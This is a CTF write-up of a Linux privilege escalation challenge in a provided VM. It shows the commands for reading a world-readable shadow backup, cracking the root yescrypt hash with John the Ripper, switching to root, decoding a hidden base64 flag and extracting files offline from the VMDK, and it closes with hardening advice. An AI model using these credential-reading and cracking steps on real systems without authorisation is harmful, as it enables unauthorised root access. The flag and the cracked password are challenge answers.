# TL Priv Escl #1 — CTF Writeup

| Property | Details |
| :--- | :--- |
| **Challenge Name** | TL Priv Escl #1 |
| **CTF Competition** | SecLeaf Q4 CTF 2026 |
| **Category / Difficulty** | System Security / Linux Privilege Escalation (Medium) |
| **Initial Credentials** | `osint` : `TLosint` |
| **Final Flag** | `SecLeaf{local_escl4t3_r00t}` |

---

## 1. Executive Summary

The **"TL Priv Escl #1"** challenge is a Linux-based boot-to-root challenge featured in the **SecLeaf Q4 CTF 2026** competition. Competitors are provided with a Virtual Appliance (`.ova`) representing a Trace Labs OSINT VM environment and initial low-privileged credentials for the user `osint`.

The objective of the challenge is to:
1. Enumerate the local system as a low-privileged user.
2. Locate an insecurely exposed shadow backup file (`shadow.bak`) containing the `root` user's password hash.
3. Crack the password hash using **John the Ripper** to obtain root credentials.
4. Elevate privileges and bypass decoy flag artifacts.
5. Recover the final flag hidden inside a multi-dot hidden directory (`...`) in `root`'s home directory.

---

## 2. Initial Access & Setup

The challenge prompt provided distribution links for the virtual machine image:

* **Drive Folder**: [Google Drive Folder](https://drive.google.com/drive/folders/17TGJckn-CsusCO0EbGs72Ov6LZylJaJm?usp=sharing)
* **Appliance Image**: `Copy of SecLeaf-001.ova` (Size: ~3.79 GB)
* **Default Credentials**: `osint` / `TLosint`

The OVA file was imported into Oracle VM VirtualBox / VMware Workstation as a Debian 64-bit virtual machine. Once booted, initial access was established via console/SSH as user `osint`.

---

## 3. Local Enumeration

After establishing a shell as `osint`, local enumeration was conducted across standard privilege escalation vectors (sudo privileges, SUID binaries, cron jobs, and home directory artifacts).

### 3.1 Home Directory Inspection

Listing the contents of `/home/osint` revealed non-standard files left behind by the challenge author:

```bash
osint@tlosint:~$ ls -la
total 124040
drwxr-xr-x 26 osint osint      4096 Oct 12 04:46 .
drwxr-xr-x  3 root  root       4096 Jul 25 22:42 ..
-rw-r--r--  1 osint osint        26 Oct  8 18:56 clue.txt
-rw-r--r--  1 osint osint        98 Oct 10 19:49 shadow.bak
drwxr-xr-x  2 osint osint      4096 Oct 10 19:51 .john
```

Two critical artifacts were identified:
* `clue.txt`: A pointer text file.
* `shadow.bak`: A backup of `/etc/shadow` containing password hashes.

Reading `clue.txt`:
```bash
osint@tlosint:~$ cat clue.txt
Check Home root maybe -.-
```

### 3.2 Sensitive Data Exposure: `shadow.bak`

Inspecting `shadow.bak` revealed an exposed password hash for `root`:

```bash
osint@tlosint:~$ cat shadow.bak
root:$y$j9T$m4ZUNRCO.qnqPL/Hbyg1n.$YAWS6EkcrDwEShrgT8mJcGM9CWLQRf9zl6zvMqQ2vw8:20734:0:99999:7:::
```

> [!NOTE]
> **Hash Analysis:** The `$y$` prefix indicates the password was hashed using **yescrypt**, a modern memory-hard, GPU/ASIC-resistant key derivation function adopted by Debian 11+ and Ubuntu 22.04+.

---

## 4. Privilege Escalation

### 4.1 Hash Cracking with John the Ripper

Because `shadow.bak` had world-readable file permissions, the hash could be cracked locally using John the Ripper. Inspection of the `.john` directory revealed that the author had already cracked the hash into `john.pot`:

```bash
osint@tlosint:~$ cat .john/john.pot
$y$j9T$m4ZUNRCO.qnqPL/Hbyg1n.$YAWS6EkcrDwEShrgT8mJcGM9CWLQRf9zl6zvMqQ2vw8:xNnWo6272k7x
```

To crack the hash manually using `rockyou.txt`:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.bak
```

**Output:**
```text
Loaded 1 password hash (yescrypt [OpenSSL 3.x])
xNnWo6272k7x     (root)
1g 0:00:00:03 DONE (2026-10-10 19:51) 0.3125g/s ...
```

* **Target Account:** `root`
* **Cracked Password:** `xNnWo6272k7x`

### 4.2 Elevating to Superuser

Switch to the `root` account using `su`:

```bash
osint@tlosint:~$ su -
Password: xNnWo6272k7x
root@tlosint:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Root privileges successfully achieved.

---

## 5. Flag Hunting & Decoy Analysis

Navigating to `/root`:

```bash
root@tlosint:~# ls -la /root
total 44
drwx------  9 root root 4096 Oct 10 19:53 .
drwxr-xr-x 18 root root 4096 Jul 25 22:42 ..
drwxr-xr-x  2 root root 4096 Oct  8 18:19 flag
drwxr-xr-x  3 root root 4096 Oct  8 18:27 osint
drwxr-xr-x  3 root root 4096 Oct  8 19:01 root
drwxr-xr-x  2 root root 4096 Oct 10 19:43 shadow
```

### 5.1 Deceptive Artifacts (Decoys)

Multiple decoy files were planted to mislead automated tools and quick checks:

| Decoy Location | Raw Content | Decoded / Translated Meaning | Role |
| :--- | :--- | :--- | :--- |
| `/root/flag/flag.txt` | `SXQgY2FuJ3QgYmUgdGhhdCBlYXN5IA==` | `"It can't be that easy "` | Decoy / Troll |
| `/root/root/root.txt` | `"Congrats you have accessed Root..."` | Plaintext pointer | Decoy / Clue |
| `/root/osint/files/flag.txt` | `VGhlIGZsYWcgZm9ybWF0IGlzIFNlY0xlYWZ7fQ==` | `"The flag format is SecLeaf{}"` | Format Hint |

### 5.2 Locating the True Flag

A recursive search inside `/root/root` uncovered a hidden directory named `...` (three dots):

```bash
root@tlosint:~# ls -la /root/root/
total 12
drwxr-xr-x 3 root root 4096 Oct  8 19:01 .
drwx------ 9 root root 4096 Oct 10 19:53 ..
drwxr-xr-x 2 root root 4096 Oct  8 19:02 ...
-rw-r--r-- 1 root root   56 Oct  8 18:59 root.txt

root@tlosint:~# ls -la /root/root/.../
total 12
drwxr-xr-x 2 root root 4096 Oct  8 19:02 .
drwxr-xr-x 3 root root 4096 Oct  8 19:01 ..
-rw-r--r-- 1 root root   25 Oct  8 19:04 flag.txt
```

Reading and decoding the contents of `/root/root/.../flag.txt`:

```bash
root@tlosint:~# cat /root/root/.../flag.txt
bG9jYWxfZXNjbDR0M19yMDB0

root@tlosint:~# echo 'bG9jYWxfZXNjbDR0M19yMDB0' | base64 -d
local_escl4t3_r00t
```

Wrapping in the required format `SecLeaf{}` gives the final flag:

> **Final Flag:** `SecLeaf{local_escl4t3_r00t}`

---

## 6. Alternative Method: Offline VMDK Forensics

Because an `.ova` package is an uncompressed POSIX tar archive containing virtual disk files, this challenge can be solved offline in under a minute without booting the VM:

1. **Extract/Inspect OVA:**
   ```bash
   tar -tf "Copy of SecLeaf-001.ova"
   ```
   *Identifies `TL_CTF-disk001.vmdk` and `SecLeaf.ovf`.*

2. **Mount/Inspect Filesystem:**
   Using tools like `7-Zip` (`7z.exe`) or `guestmount`, open the ext4 root partition within the VMDK.

3. **Extract Target Files Directly:**
   ```bash
   7z x TL_CTF-disk001.vmdk "root/*"
   ```
   Navigate directly into `root/root/.../flag.txt` and decode the Base64 string to recover the flag.

---

## 7. Security Hardening & Remediation

To prevent this privilege escalation path in production systems:

* **Strict Credential Hygiene**: Never leave backups of sensitive system databases (`/etc/shadow`, `/etc/passwd`) in user directories. Any credential backups must be encrypted and assigned strict permissions (`0600 root:root`).
* **Disable Direct Root Login**: Enforce administrative access through `sudo` with individual named accounts, audit logging, and multi-factor authentication (MFA).
* **Strong Password Policy**: Require long, high-entropy passwords to resist dictionary and brute-force attacks against offline hashes.
* **File Integrity Monitoring (FIM)**: Implement audit frameworks (such as `auditd` or OSQuery) to alert whenever files matching backup extensions (`*.bak`, `*.old`, `*.save`) are generated or accessed.
